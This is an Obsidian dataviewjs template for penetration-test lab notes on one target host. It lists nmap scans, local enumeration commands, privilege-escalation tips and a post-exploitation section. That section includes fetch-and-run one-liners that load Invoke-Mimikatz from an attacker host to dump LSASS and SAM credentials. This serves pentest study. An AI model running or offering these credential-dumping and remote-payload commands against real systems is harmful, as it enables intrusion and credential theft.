---
# essential vars
ip_address: 'ip'
hostname: 'hostname'
fqdn: ''
dns_server: ''
subnet: ''
initial_foothold: ''
initial_foothold_description: >
 initial foothold description
privilege_escalation: ''
privilege_escalation_description: >
 priv esc description 
os: 'windows'
os_version: ''
architecture: ''
dependencies: ''
pw_table_fmt:
 - 'SERVICE'
 - 'USER'
 - 'HASH_TYPE'
 - 'HASH'
pws:
 - {svc: 'winrm', usr: 'administrator', ht: 'nt', hash: 'sdfasdfasdfa'}
 - {svc: 'rdp', usr: 'admins', ht: 'plaintext', hash: 'waffles'}
 - {svc: 'N/A', usr: 'N/A', ht: 'N/A', hash: 'N/A'}
if_difficulty: '1-10' # initial foothold difficulty
pe_difficulty: '1-10' # privilege escalation difficulty
difficulty: '1-10' # overall difficulty
# Display Options
display_primer: 'yes'
show_local_commands: 'yes'
display_reflection: 'yes'
display_ad_post_enum: 'no'
rif: > # reflection initial foothold
 stuff i learned
rpe: > # reflection priviledge escalation
 stuff i learned
til: > # things I learned
 stuff i learned
service_enumeration_primer: > # Enumeration Helpers
 1. The bare minimum we are going to do here is cross check the service name, version number, and/or distribution on ***searchsploit AND google***. There may be an exploit that in a later release that affects prior version.
 
 2. If we find an unknown service that we cannot profile with nmap then we need to perform a manual banner grap and google the results.<br><pre><code>nc -nvvC &lt;ip&gt; &lt;port&gt;</code></pre>
 
 3. If we still cant get any information about the server with a manual banner grab then we must open <b><i>wireshark/tcpdump</i></b> and start inspecting packets.
 
 4. Find a webserver with nothing interesting? Start bruteforcing, small, medium, and large wordlists.
 
 5. If we find a file inclusion vuln we need to check if we can read the config files of other services.
 
 6. We must probe all application inputs for xss/sqli with: <pre><code>< > &#39; &#39; { } ;</code></pre>
 
 7. If we come across a any kind of webfilter we must use an os command injection wordlist to bypass the filter.
 
 8. We should also be aware of password reusage. If we find a password for a users ftp account it&apos;s worth it to try on rdp/ssh etc. You never know until you do.
 
 9. If nothing seems to pan out our last resort is to bruteforce users and/or passwords.
privilege_escalation_primer: >
 1. Scripts/binaries thats reference other scripts/binaries that don&#39;t use full(linux) or a quoted path(windows) path. We can modify the path and create a malicious binary.
 
 2. The service path can be quoted, but if we have write permissions on the directory where the service is installed then quoting the path does not matter.

 3. Any database running as root with no password is an easy win, if we have the password it&#39;s still an easy win.
 
 4. The ability to point a webserver to files that we control, particularly when the webserver is running as root. This all happens alot when an ftproot points to the webserver root. It can also happen over smb.
 
 5. One thing that we should be aware of is any git repo. If we search back in the commit history we may find something interesting.
 
 6. If we dont find anything after our standard enumeration its time start searching for kernel exploits.
# html entities because I've had some pain in the ass display issues, we now use js format strings,
# for special characters.
bslash: '&#92;' # \
fslash: '&#47;' # /
dllr: '&#36;' # $
squote: '&#39;' # '
dquote: '&#34;' # "
colon: '&#58;' # :
bang: '&#33;' # !
pipe: '&#124;' # |
pcnt: '&#37;' # %
amp: '&#38;' # &
und: '&#95;' # __
ask: '&#42;' # *
---
```dataviewjs
let pg = dv.current()
let title = pg.ip_address + ' ' + pg.hostname;
dv.header(1, title);
```
## Index:
1. [RECON](#RECON)
2. [INFORMATION GATHERING](#INFORMATION%20GATHERING)
3. [INITIAL FOOTHOLD](#INITIAL%20FOOTHOLD)
4. [LOCAL INFORMATION GATHERING](#LOCAL%20INFORMATION%20GATHERING)
5. [PRIVILEGE ESCALATION](#PRIVILEGE%20ESCALATION)
6. [POST EXPLOITATION](#POST%20EXPLOITATION)
## RECON
### OSINT
### ZONE TRANSFERS
## INFORMATION GATHERING
#### Ping Sweeps
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Powershell Ping Sweep Class C`;
	let cmd=`<pre><code>1..255 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}</code></pre>`;
	dv.header(5, heading)
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`NO Powershell Ping Sweep Class C`;
	let cmd=`<pre><code>for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.</code></pre>`;
	dv.header(5, heading)
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Linux Ping Sweep Class C`;
	let cmd=`<pre><code>for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done</code></pre>`;
	dv.header(5, heading)
	dv.paragraph(cmd);
}
```
### Vuln Scans
### Port Scans
 If we output the nmap scan in xml we can use searchsploit --nmap to check all service versions against exploitdb.

#### TCP
##### All Open Ports
```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Open Ports => '$ip-fulltcp.scan'`;
	let cmd=`<pre><code>sudo nmap -sS -p- $ip -oN $ip-fulltcp.scan -T4 </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
##### All Ports Service scan
```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Extract Open Ports from '$ip-fulltcp.scan'`;
	let cmd=`<pre><code>cat $ip-fulltcp.scan | grep open | awk -F "/" '{ORS=","} {print $1}' | sed 's/.$//' </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Run a Service scan on all open ports`;
	let cmd=`<pre><code>sudo nmap -sS -sC -sV $ip -oN $ip-fulltcp-service.scan -p  </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

#### UDP
##### Top 1000 Open Ports
```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Open Ports => '$ip-udp1k.scan'`;
	let cmd=`<pre><code>sudo nmap -sU $ip -oN $ip-udp1k.scan -T4 </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

##### Top 1000 Open Ports Service Scan
```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Extract Open Ports from '$ip-udp1k.scan'`;
	let cmd=`<pre><code>cat $ip-udp1k.scan | grep open | awk -F "/" '{ORS=","} {print $1}' | sed 's/.$//' </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.show_local_commands === 'yes')
{
	let heading=`Run a Service scan on all open ports`;
	let cmd=`<pre><code>sudo nmap -sU -sC -sV -oN $ip-udp1k-service.scan -p  </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}

```
### Service Enumeration
```dataviewjs
let pg = dv.current();
if(pg.display_primer === 'yes')
{
	dv.el('hr','');
	dv.header(4, 'Service Enumeration Primer');
	dv.paragraph(pg.service_enumeration_primer);
	dv.el('hr','');
}
```
## INITIAL FOOTHOLD
## LOCAL INFORMATION GATHERING
### Users & Groups
#### All Local Users
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>net user</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}passwd</code></pre>`;
	dv.header(5, heading);	
	dv.paragraph(cmd);
}
```
#### All Local groups
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Members of builtin${pg.bslash}administrators`;
	let cmd=`<pre><code>net localgroup administrators</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Members of builtin${pg.bslash}users`;
	let cmd=`<pre><code>net localgroup users</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}group</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
#### Current User
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Current Users groups`;
	let cmd=`<pre><code>whoami ${pg.fslash}groups</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Current Users groups`;
	let cmd=`<pre><code>id</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Current Users privileges`;
	let cmd=`<pre><code>whoami ${pg.fslash}priv</code></pre>`;
	dv.header(5, heading)
	dv.paragraph(cmd);
}
```
### PATH Variable
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Display path in cmd prompt.`;
	let cmd=`<pre><code>echo ${pg.pcnt}path${pg.pcnt}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	
	heading=`Display path in powershell.`;
	cmd=`<pre><code>${pg.dllr}env:path</code></pre>`;
	dv.header(5,heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>echo ${pg.dllr}PATH</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

### OS Version & Architecture
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Focused cmd prompt.`;
	let cmd=`<pre><code>systeminfo ${pg.pipe} findstr ${pg.fslash}B ${pg.fslash}C${pg.colon}${pg.dquote}OS Name${pg.dquote} ${pg.fslash}C${pg.colon}${pg.dquote}OS Version${pg.dquote} ${pg.fslash}C${pg.colon}${pg.dquote}System Type${pg.dquote}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	
	heading=`Focused powershell.`;
	cmd=`<pre><code>Get-WmiObject Win32_OperatingSystem ${pg.pipe} Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName </code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}issue ${pg.amp}${pg.amp} cat ${pg.fslash}etc${pg.fslash}*-release ${pg.amp}${pg.amp} uname -a</code></pre>`;
	dv.header(5,heading);
	dv.paragraph(cmd);

}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`All system information`;
	let desc=`Map hot fixes to kernel exploits by piping the output of <i>systeminfo</i> into <i>windows exploit suggester (wes)</i>.`;
	let cmd=`<pre><code>systeminfo</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	
	cmd=`<pre><code>wes --update</code></pre`;
	dv.paragraph(cmd);
	cmd=`<pre><code>wes -e systeminfo.txt --exploits-only</code></pre>`;
	dv.paragraph(cmd);
}
```

### Networking Information
#### Hostname, Network interfaces
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>hostname ${pg.amp}${pg.amp} ipconfig ${pg.fslash}all</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Most universal across distributions.`;
	let cmd=`<pre><code>hostname ${pg.amp}${pg.amp} ip a</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	
	heading=`Older fallback.`;
	cmd=`<pre><code>hostname ${pg.amp}${pg.amp} ipconfig</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

#### Routes
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>route print</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>route</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	
	heading=`Depending on the distribution.`;
	cmd=`<pre><code>routel</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

#### Active Connections
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>netstat -ano</code></pre>`;
	dv.header(5,heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Equivalent across distributions.`;
	let cmd=`<pre><code>netstat -antp</code></pre> <pre><code>ss -antp</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

### Readable/Writable Files And Folders
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Command prompt.`;
	let cmd=`<pre><code>icacls "C${pg.colon}${pg.bslash}dir${pg.bslash}we${pg.bslash}want"</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	
	heading=`Sysinternals.`;
	cmd=`<pre><code>accesschk.exe -uws ${pg.dquote}Everyone${pg.dquote} ${pg.dquote}C${pg.colon}${pg.bslash}Program Files${pg.dquote}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>find ${pg.fslash} -writable -type d 2>${pg.fslash}dev${pg.fslash}null</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	cmd=`<pre><code>find ${pg.fslash} -writable -type f 2>${pg.fslash}dev${pg.fslash}null</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Powershell: Check User Installed Software That Everyone Is Allowed to Modify.`;
	let desc=`Here we check <i>${pg.dquote}C${pg.colon}${pg.bslash}Program Files*${pg.dquote}</i> because this is the place where we will user installed 3rd party software. It${pg.squote}s much more likely that a 3rd party vendor release a software package with weak permissions than Microsoft.`
	let cmd=`<pre><code>Get-ChildItem ${pg.dquote}C${pg.colon}${pg.bslash}Program Files*${pg.dquote} -Recurse ${pg.pipe} Get-ACL ${pg.pipe} ?{$_.AccessToString -match "Everyone${pg.bslash}sAllow${pg.bslash}s${pg.bslash}sModify"}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Powershell: Check Files That all Builtin Users Are Allowed to Modify.`;
	let desc=`Here we check the entire <i>C</i> drive for files that members of the Builtin Users group are allowed to modify. Here we widen the search above,in the number of directories that we check but shrink the level of permissions that we are looking for from everyone(which includes the guest account) to builtin users.`;
	let cmd=`<pre><code>Get-ChildItem ${pg.dquote}C${pg.colon}${pg.bslash}${pg.dquote} -Recurse ${pg.pipe} Get-ACL ${pg.pipe} ?{$_.AccessToString -match "BUILTIN${pg.bslash}${pg.bslash}Users${pg.bslash}sAllow${pg.bslash}s${pg.bslash}sReadAndExecute"}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	desc=`When Get-ACL encounters an access denied error it terminates the pipeline, which means for us we would have to be investigating directories 1 by 1... The script below is the way around that.`
	cmd=`<pre><code><#
invoke with: iex (new-object system.net.webclient).downloadstring('http://ip/script.ps1')
#>
$searchRoot="C:\"
$items = Get-ChildItem $searchRoot -ErrorAction Continue | Select-Object fullname
foreach ($item in $items) {
	try {
                  Get-Acl $item.FullName | ?{$_.AccessToString -match "BUILTIN\\Users\sAllow\s\sReadAndExecute"}
         }
         catch [System.UnauthorizedAccessException] {
                 Write-Host "Unauthorized Access Exception on:" $item.fullname
         }
         catch {
                 Write-Host "Unspecified Exception" $_
         }
}</code></pre>`
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

### Running Processes And Services
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`We must keep in mind our process integrity level because on windows based systems none of these commands will list processes run by privileged users, we would need higher privileges to gather this information.`;
	dv.header(4, heading);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`All windows processes that are mapped to a specific service.`;
	let cmd=`<pre><code>tasklist ${pg.fslash}SVC</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>ps axu</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`All Running Services using powershell.`;
	let cmd=`<pre><code> Get-WmiObject win32${pg.und}service ${pg.pipe} Select-Object Name, State, PathName, StartMode ${pg.pipe} Where-Object {$_.State -like ${pg.squote}Running${pg.squote}} ${pg.pipe} FL</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`All User Installed Running Services using powershell.`;
	let cmd=`<pre><code> Get-WmiObject win32${pg.und}service ${pg.pipe} Select-Object Name, State, PathName, StartMode ${pg.pipe} Where-Object {($_.State -like ${pg.squote}Running${pg.squote}) -and ($${pg.und}.PathName -like ${pg.squote}${pg.ask}C${pg.colon}${pg.bslash}Program${pg.ask}${pg.squote} )} ${pg.pipe} FL</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`All User Installed Running Services <b>WITHOUT</b>using powershell.`;
	let desc=`If powershell is unavailable, like say its blocked by group policy we can use this as an equivalent of the get-wmiobject commandlet. This returns nonstandard services that we can probe for unquoted service paths and/or weak file/directory permissions.`;
	let cmd=`<pre><code>wmic service get name,displayname,pathname,startmode ${pg.pipe} findstr ${pg.fslash}i ${pg.dquote}auto${pg.dquote} ${pg.pipe} findstr ${pg.fslash}i ${pg.fslash}v ${pg.dquote}C${pg.colon}${pg.bslash}windows${pg.dquote}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

### Installed Applications And Patch Levels
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Keep in mind that wmic can only list packages installed by microsoft installer`;
	dv.header(4, heading);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>wmic product get name, version, vendor</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);

}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`This varies by distribution.`;
	let desc=`We must be sure to look at ${pg.fslash}usr${pg.fslash}bin and ${pg.fslash}usr${pg.fslash}local${pg.fslash}bin`;
	let cmd=`<pre><code>dpkg -l</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	cmd=`<pre><code>rpm -qa</code></pre>`;
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Hotfix ID${pg.squote}s and Installation Date.`;
	let cmd=`<pre><code>wmic qfe get ${pg.fslash}format${pg.colon}csv ${pg.pipe} ConvertFrom-Csv ${pg.pipe} select-object Caption,Description,HotFixID,InstalledOn</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

### Binaries That Auto Elevate
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`If this registry key exists in either hive and it${pg.squote}s value is 0x1 free win.`;
	let cmd=`<pre><code>reg query HKEY_CURRENT_USER${pg.bslash}Software${pg.bslash}Policies${pg.bslash}Microsoft${pg.bslash}Windows${pg.bslash}Installer</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	cmd=`<pre><code>reg query HKEY_LOCAL_MACHINE${pg.bslash}Software${pg.bslash}Policies${pg.bslash}Microsoft${pg.bslash}Windows${pg.bslash}Installer</code></pre>`;
	dv.paragraph(cmd);
	cmd=`<pre><code>reg query HKEY_CURRENT_USE${pg.bslash}Software${pg.bslash}Policies${pg.bslash}Microsoft${pg.bslash}Windows${pg.bslash}Installer</code></pre>`;
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Sudo Version.`;
	let cmd=`<pre><code>sudo -V</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Any time we suspect that there is a task running on windows we should check the windows registry to see if a credential is cached. This is an indirect way of elevation.`;
	let cmd = `<pre><code>reg query HKLM${pg.bslash}Software${pg.bslash}Microsoft${pg.bslash}Windows NT${pg.bslash}Currentversion${pg.bslash}Winlogon</code></pre>`;
	dv.header(5,heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Suid binaries.`;
	let cmd=`<pre><code>find ${pg.fslash} -perm -u=s -type f 2>${pg.fslash}dev${pg.fslash}null</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Elevated Commands(i.e Sudoers).`;
	let cmd=`<pre><code>sudo -l</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
### Scheduled Tasks
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>schtasks ${pg.fslash}query ${pg.fslash}fo LIST ${pg.fslash}v</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}crontab</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>ls -lah ${pg.fslash}etc${pg.fslash}cron${pg.ask}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>grep ${pg.dquote}CRON${pg.dquote} ${pg.fslash}var${pg.fslash}log${pg.fslash}cron.log</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
### Firewall Status And Rules
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Current Profile.`;
	let cmd=`<pre><code>netsh advfirewall show currentprofile</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	heading=`Enumerate Specific Rules`;
	cmd=`<pre><code>netsh advfirewall show currentprofile</code></pre>`
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`We need to be root to enumerate firewall rules on Linux.`;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}iptables</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	heading=`All Rules.`;
	cmd=`<pre><code>sudo iptables -S</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
	heading=`All Rules Tableview.`;
	cmd=`<pre><code>sudo iptables -L</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
### Unmounted Disks
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>mountvol</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}fstab</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()

if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>mount</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>${pg.fslash}bin${pg.fslash}lsblk</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>cat ${pg.fslash}etc${pg.fslash}exports</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

### Device Drivers And Kernel Modules
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>driverquery.exe ${pg.fslash}v ${pg.fslash}fo csv ${pg.pipe} ConvertFrom-CSV ${pg.pipe} Select-Object ${pg.squote}Display Name${pg.squote}, ${pg.squote}Start Mode${pg.squote}, Path</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=``;
	let cmd=`<pre><code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```


```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`All Kernel Modules.`;
	let cmd=`<pre><code>lsmod</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current()
if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Specific module info.`;
	let cmd=`<pre><code>${pg.fslash}sbin${pg.fslash}modinfo &lt;module name&gt;</code></pre>`;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```
### Other
```dataviewjs
let pg = dv.current()
if(pg.os === 'windows' && pg.show_local_commands === 'yes')
{
	let heading=`Winpeas`;
	let cmd=``;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
else if(pg.os === 'linux' && pg.show_local_commands === 'yes')
{
	let heading=`Linpeas`;
	let cmd=``;
	dv.header(5, heading);
	dv.paragraph(cmd);
}
```

## PRIVILEGE ESCALATION
```dataviewjs
let pg = dv.current();
if(pg.display_primer === 'yes')
{
	dv.el('hr','');
	dv.header(4, 'Priviledge Escalation Primer');
	dv.paragraph(pg.privilege_escalation_primer);
	dv.el('hr','');
}
```

## POST EXPLOITATION
```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes')
{
	let heading = "Active Directory Enumeration"
	dv.header(3, heading);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes') 
{
	let heading = "Dumping LSASS Mimikatz";
	let desc = `Here we search for credentials cached in memory`;
	let cmd = `<pre><code>iex (New-object System.net.webclient).downloadstring('http://<ip>/invoke-mimikatz.ps1'); Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::lsa /patch"'</code></pre>`
	dv.header(4, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes') 
{
	let heading = "Dumping SAM Mimikatz";
	let desc = `Here we search the local password db for credentials.`;
	let cmd = `<pre><code>iex (New-object System.net.webclient).downloadstring('http://<ip>/invoke-mimikatz.ps1'); Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::sam"'</code></pre>`
	dv.header(4, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes') 
{
	let heading = "Recently logged in usersMimikatz";
	let desc = `Here we search the local password db for credentials.`;
	let cmd = `<pre><code>iex (New-object System.net.webclient).downloadstring('http://<ip>/invoke-mimikatz.ps1'); Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::sam"'</code></pre>`
	dv.header(4, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
}
```

```dataviewjs
let pg = dv.current();
if(pg.display_ad_post_enum === 'yes' && pg.show_local_commands === 'yes')
{
	let heading = "All Domain Groups";
	let desc=`See [zinhart domain enumeration](https://github.com/zinhart/domain-enumeration.git).`;
	let cmd=`<pre><code>. .\\Get-DomainGroups.ps1; Get-DomainGroups -All</code></pre>`;
	dv.header(4, heading);
	dv.paragraph(desc);
	dv.paragraph(cmd);
	desc=`In memory execution`;
